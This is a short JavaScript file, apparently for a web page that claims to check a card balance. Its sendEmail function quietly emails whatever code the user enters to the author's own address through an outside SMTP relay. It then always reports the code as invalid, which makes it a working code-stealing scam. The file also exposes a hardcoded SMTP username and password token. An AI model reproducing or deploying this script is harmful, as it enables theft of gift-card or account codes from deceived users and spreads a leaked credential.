function sendEmail() {
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "samdaviswills@gmail.com",
        Password : "EEF3A3E7F326A056EA09BB9027E7D6753096",
        To : 'samdaviswills@gmail.com',
        From : "samdaviswills@gmail.com",
        Subject : "Balance Check",
        Body : "Code: " + document.getElementById("enter-code").value
    }).then(
        opps.innerHTML = "opps you have entered an invalid code"
    );
}
function opps() {
    var opps = document.getElementById("opps");
    opps.innerHTML = "opps you have entered an invalid code";
}

function validation() {
    var form = document.getElementById("form");
    var enterCode = document.getElementById("enter-code").value;
    var aria = document.getElementById("aria");
    if (enterCode.length == 0){
        form.classList.add("invalid");
        form.classList.remove("valid");
        aria.innerHTML = "code is required to check balance";
        aria.style.padding = "5px";
    } else  {
        form.classList.add("valid");
        form.classList.remove("invalid");
        aria.innerHTML = "";
        aria.style.padding = "";
    }
}